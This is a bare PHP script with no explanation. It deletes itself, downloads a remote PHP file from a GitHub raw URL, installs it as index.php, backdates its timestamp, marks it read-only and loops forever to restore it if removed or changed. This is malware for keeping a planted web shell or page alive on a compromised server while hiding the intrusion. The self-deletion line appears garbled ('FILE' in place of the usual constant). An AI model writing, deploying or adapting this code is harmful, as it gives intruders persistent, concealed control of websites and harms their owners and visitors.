<?php 
@unlink(FILE); 
$path = dirname(FILE); 
$map_path = $path . "/index.php"; 
$contente = "https://raw.githubusercontent.com/Jenderal92/KC5/master/b.php"; 
$index_path = $map_path; 
$index_content = getContent($contente); 
$index_md5 = md5($index_content); 
while (true) { 
    if (!file_exists($index_path)) { 
        file_put_contents($index_path, $index_content); 
        touch($index_path, strtotime("-400 days")); 
        chmod($index_path, 0444); 
    } else { 
        $temp_md5 = md5(getContent($index_path)); 
        if ($temp_md5 != $index_md5) { 
            file_put_contents($index_path, $index_content); 
            touch($index_path, strtotime("-400 days")); 
            chmod($index_path, 0444); 
        } 
    } 
    sleep(1); 
} 
 
 
function getContent($path) { 
    if (function_exists('file_get_contents')) { 
        return @file_get_contents($path); 
    } else { 
        $ch = curl_init(); 
        curl_setopt($ch, CURLOPT_URL, $path); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
        $content = curl_exec($ch); 
        curl_close($ch); 
        return $content; 
    } 
} 
?>
